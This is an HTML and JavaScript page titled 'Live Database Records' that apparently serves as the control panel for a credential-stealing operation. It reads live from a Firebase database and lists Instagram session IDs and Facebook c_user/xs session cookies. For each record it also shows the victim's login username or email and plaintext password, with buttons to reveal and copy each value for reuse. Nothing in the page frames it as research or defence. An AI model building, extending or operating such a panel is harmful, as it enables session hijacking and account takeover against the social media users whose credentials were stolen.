<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Sessions Data</title>
  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }

    body {
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
      background-color: #fafafa;
      color: #111827;
      padding: 24px;
      line-height: 1.5;
    }

    .container {
      max-width: 1200px;
      margin: 0 auto;
    }

    /* Top bar */
    .top-bar {
      display: flex;
      justify-content: space-between;
      align-items: center;
      padding-bottom: 16px;
      border-bottom: 1px solid #e5e7eb;
      margin-bottom: 20px;
    }

    .title {
      font-size: 18px;
      font-weight: 600;
      color: #111827;
    }

    .status {
      font-size: 13px;
      color: #6b7280;
    }

    .status.connected {
      color: #059669;
      font-weight: 500;
    }

    .status.error {
      color: #dc2626;
      font-weight: 500;
    }

    /* Controls */
    .controls {
      display: flex;
      justify-content: space-between;
      align-items: center;
      gap: 12px;
      margin-bottom: 16px;
      flex-wrap: wrap;
    }

    .tabs {
      display: flex;
      gap: 8px;
    }

    .tab-btn {
      background: #ffffff;
      border: 1px solid #d1d5db;
      padding: 6px 14px;
      font-size: 13px;
      font-weight: 500;
      border-radius: 4px;
      cursor: pointer;
      color: #374151;
    }

    .tab-btn:hover {
      background: #f3f4f6;
    }

    .tab-btn.active {
      background: #111827;
      color: #ffffff;
      border-color: #111827;
    }

    .search-box {
      border: 1px solid #d1d5db;
      background: #ffffff;
      padding: 6px 12px;
      border-radius: 4px;
      font-size: 13px;
      width: 260px;
      outline: none;
    }

    .search-box:focus {
      border-color: #111827;
    }

    /* Table & Cards */
    .data-table {
      width: 100%;
      border-collapse: collapse;
      background: #ffffff;
      border: 1px solid #e5e7eb;
      border-radius: 6px;
      overflow: hidden;
      font-size: 13px;
    }

    .data-table th {
      background: #f9fafb;
      padding: 10px 14px;
      text-align: left;
      font-weight: 600;
      color: #4b5563;
      border-bottom: 1px solid #e5e7eb;
    }

    .data-table td {
      padding: 12px 14px;
      border-bottom: 1px solid #e5e7eb;
      vertical-align: top;
    }

    .data-table tr:last-child td {
      border-bottom: none;
    }

    .data-table tr:hover {
      background: #f9fafb;
    }

    .mono {
      font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace;
      font-size: 12px;
      color: #111827;
      background: #f3f4f6;
      padding: 2px 6px;
      border-radius: 3px;
      word-break: break-all;
    }

    .token-cell {
      max-width: 380px;
      word-break: break-all;
    }

    .btn-action {
      background: #ffffff;
      border: 1px solid #d1d5db;
      padding: 3px 8px;
      font-size: 11px;
      border-radius: 3px;
      cursor: pointer;
      color: #374151;
      margin-left: 6px;
      vertical-align: middle;
    }

    .btn-action:hover {
      background: #f3f4f6;
      border-color: #9ca3af;
    }

    .time-text {
      color: #6b7280;
      font-size: 12px;
      white-space: nowrap;
    }

    .empty-state {
      text-align: center;
      padding: 48px 16px;
      color: #6b7280;
      background: #ffffff;
      border: 1px solid #e5e7eb;
      border-radius: 6px;
      font-size: 14px;
    }

    /* Notification */
    .toast {
      position: fixed;
      bottom: 20px;
      right: 20px;
      background: #111827;
      color: #ffffff;
      padding: 8px 14px;
      font-size: 12px;
      border-radius: 4px;
      opacity: 0;
      transition: opacity 0.2s ease;
      pointer-events: none;
    }

    .toast.show {
      opacity: 1;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="top-bar">
      <div class="title">Live Database Records</div>
      <div id="status" class="status">Connecting to Firebase...</div>
    </div>

    <div class="controls">
      <div class="tabs">
        <button id="tabIg" class="tab-btn active" onclick="switchTab('instagram')">Instagram (<span id="countIg">0</span>)</button>
        <button id="tabFb" class="tab-btn" onclick="switchTab('facebook')">Facebook (<span id="countFb">0</span>)</button>
      </div>

      <input
        type="text"
        id="search"
        class="search-box"
        placeholder="Filter records..."
        oninput="handleSearch()"
      >
    </div>

    <div id="contentArea">
      <div class="empty-state">Loading data...</div>
    </div>
  </div>

  <div id="toast" class="toast">Copied</div>

  <!-- Firebase Scripts -->
  <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore-compat.js"></script>

  <script>
    const firebaseConfig = {
      apiKey: "AIzaSyDvIbPNBaUGc5LK0wujhIFSG_WTcT7ElLc",
      authDomain: "sessionid-74814.firebaseapp.com",
      projectId: "sessionid-74814",
      storageBucket: "sessionid-74814.appspot.com",
      messagingSenderId: "299780937054",
      appId: "1:299780937054:web:d59aeaedccd1439c6febcf",
      measurementId: "G-JSQEE28YSP"
    };

    firebase.initializeApp(firebaseConfig);
    const db = firebase.firestore();

    let currentTab = 'instagram';
    let instagramList = [];
    let facebookList = [];
    let filterQuery = '';

    const statusEl = document.getElementById('status');

    // Instagram Listener
    db.collection('instagram').onSnapshot((snapshot) => {
      statusEl.textContent = 'Connected';
      statusEl.className = 'status connected';

      instagramList = [];
      snapshot.forEach(doc => {
        instagramList.push({ id: doc.id, ...doc.data() });
      });

      instagramList.sort((a, b) => getTime(b.timestamp) - getTime(a.timestamp));
      document.getElementById('countIg').textContent = instagramList.length;

      if (currentTab === 'instagram') render();
    }, (err) => {
      console.error(err);
      statusEl.textContent = 'Error: ' + err.message;
      statusEl.className = 'status error';
    });

    // Facebook Listener
    db.collection('facebook').onSnapshot((snapshot) => {
      statusEl.textContent = 'Connected';
      statusEl.className = 'status connected';

      facebookList = [];
      snapshot.forEach(doc => {
        facebookList.push({ id: doc.id, ...doc.data() });
      });

      facebookList.sort((a, b) => getTime(b.timestamp) - getTime(a.timestamp));
      document.getElementById('countFb').textContent = facebookList.length;

      if (currentTab === 'facebook') render();
    }, (err) => {
      console.error(err);
      statusEl.textContent = 'Error: ' + err.message;
      statusEl.className = 'status error';
    });

    function getTime(ts) {
      if (!ts) return 0;
      if (ts.toDate) return ts.toDate().getTime();
      if (typeof ts === 'string') return new Date(ts).getTime();
      if (ts.seconds) return ts.seconds * 1000;
      return 0;
    }

    function formatDate(ts) {
      if (!ts) return '-';
      const d = ts.toDate ? ts.toDate() : new Date(ts);
      if (isNaN(d.getTime())) return '-';
      return d.toLocaleString();
    }

    function switchTab(tab) {
      currentTab = tab;
      document.getElementById('tabIg').className = tab === 'instagram' ? 'tab-btn active' : 'tab-btn';
      document.getElementById('tabFb').className = tab === 'facebook' ? 'tab-btn active' : 'tab-btn';
      render();
    }

    function handleSearch() {
      filterQuery = document.getElementById('search').value.toLowerCase().trim();
      render();
    }

    function copyVal(val) {
      navigator.clipboard.writeText(val).then(() => {
        const toast = document.getElementById('toast');
        toast.classList.add('show');
        setTimeout(() => toast.classList.remove('show'), 1500);
      });
    }

    function togglePwd(id, rawVal) {
      const el = document.getElementById(id);
      const btn = document.getElementById('btn-' + id);
      if (el.dataset.hidden === 'true') {
        el.textContent = rawVal;
        el.dataset.hidden = 'false';
        btn.textContent = 'Hide';
      } else {
        el.textContent = '••••••••';
        el.dataset.hidden = 'true';
        btn.textContent = 'Show';
      }
    }

    function render() {
      const container = document.getElementById('contentArea');
      const list = currentTab === 'instagram' ? instagramList : facebookList;

      const filtered = list.filter(item => {
        if (!filterQuery) return true;
        return JSON.stringify(item).toLowerCase().includes(filterQuery);
      });

      if (filtered.length === 0) {
        container.innerHTML = `<div class="empty-state">${filterQuery ? 'No matching records found' : 'No records found in database'}</div>`;
        return;
      }

      if (currentTab === 'instagram') {
        let html = `
          <table class="data-table">
            <thead>
              <tr>
                <th>Time</th>
                <th>Username</th>
                <th>User ID</th>
                <th>Session ID</th>
                <th>Credentials</th>
              </tr>
            </thead>
            <tbody>
        `;

        filtered.forEach((item, index) => {
          const username = item.username || item.loginUsername || '-';
          const userId = item.userId || '-';
          const sessionId = item.sessionId || '-';
          const hasCreds = item.loginUsername || item.loginPassword;
          const pwdId = 'ig-pwd-' + index;

          html += `
            <tr>
              <td class="time-text">${formatDate(item.timestamp)}</td>
              <td><strong>${escapeHtml(username)}</strong></td>
              <td><span class="mono">${escapeHtml(userId)}</span></td>
              <td class="token-cell">
                <span class="mono">${escapeHtml(sessionId)}</span>
                ${sessionId !== '-' ? `<button class="btn-action" onclick="copyVal('${escapeQuotes(sessionId)}')">Copy</button>` : ''}
              </td>
              <td>
                ${hasCreds ? `
                  <div>User: <span class="mono">${escapeHtml(item.loginUsername || '-')}</span></div>
                  <div style="margin-top:4px;">
                    Pass: <span id="${pwdId}" data-hidden="true" class="mono">••••••••</span>
                    <button id="btn-${pwdId}" class="btn-action" onclick="togglePwd('${pwdId}', '${escapeQuotes(item.loginPassword || '')}')">Show</button>
                    <button class="btn-action" onclick="copyVal('${escapeQuotes(item.loginPassword || '')}')">Copy</button>
                  </div>
                ` : '<span style="color:#9ca3af;">None</span>'}
              </td>
            </tr>
          `;
        });

        html += `</tbody></table>`;
        container.innerHTML = html;
      } else {
        // Facebook
        let html = `
          <table class="data-table">
            <thead>
              <tr>
                <th>Time</th>
                <th>c_user (User ID)</th>
                <th>xs (Session)</th>
                <th>Credentials</th>
              </tr>
            </thead>
            <tbody>
        `;

        filtered.forEach((item, index) => {
          const cUser = item.c_user || '-';
          const xs = item.xs || '-';
          const hasCreds = item.loginEmail || item.loginPassword;
          const pwdId = 'fb-pwd-' + index;

          html += `
            <tr>
              <td class="time-text">${formatDate(item.timestamp)}</td>
              <td>
                <span class="mono">${escapeHtml(cUser)}</span>
                ${cUser !== '-' ? `<button class="btn-action" onclick="copyVal('${escapeQuotes(cUser)}')">Copy</button>` : ''}
              </td>
              <td class="token-cell">
                <span class="mono">${escapeHtml(xs)}</span>
                ${xs !== '-' ? `<button class="btn-action" onclick="copyVal('${escapeQuotes(xs)}')">Copy</button>` : ''}
              </td>
              <td>
                ${hasCreds ? `
                  <div>Email: <span class="mono">${escapeHtml(item.loginEmail || '-')}</span></div>
                  <div style="margin-top:4px;">
                    Pass: <span id="${pwdId}" data-hidden="true" class="mono">••••••••</span>
                    <button id="btn-${pwdId}" class="btn-action" onclick="togglePwd('${pwdId}', '${escapeQuotes(item.loginPassword || '')}')">Show</button>
                    <button class="btn-action" onclick="copyVal('${escapeQuotes(item.loginPassword || '')}')">Copy</button>
                  </div>
                ` : '<span style="color:#9ca3af;">None</span>'}
              </td>
            </tr>
          `;
        });

        html += `</tbody></table>`;
        container.innerHTML = html;
      }
    }

    function escapeHtml(str) {
      if (!str) return '';
      return String(str)
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#39;');
    }

    function escapeQuotes(str) {
      if (!str) return '';
      return String(str).replace(/'/g, "\\'").replace(/"/g, '\\"');
    }
  </script>
</body>
</html>
